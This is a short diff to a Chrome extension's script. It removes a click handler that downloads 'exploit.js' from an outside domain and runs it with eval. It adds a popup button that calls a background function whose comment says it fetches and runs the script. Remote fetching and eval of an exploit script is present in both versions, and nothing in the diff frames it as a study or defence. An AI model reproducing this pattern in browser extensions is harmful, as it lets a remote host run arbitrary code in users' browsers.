@@ -1,12 +1,6 @@
-chrome.browserAction.onClicked.addListener(function(tab) {
-    fetch('https://compactcow.com/ltbeef/exploit.js')
-      .then(response => response.text())
-      .then(text => {
-        try {
-          eval(text);  // Evaluate the fetched script
-        } catch (error) {
-          console.error('Error executing script:', error);
-        }
-      });
+document.getElementById('execute').addEventListener('click', function() {
+    chrome.runtime.getBackgroundPage(function(backgroundPage) {
+      backgroundPage.fetchAndExecuteScript(); // Calls the background function to fetch and run the script
+    });
   });
   
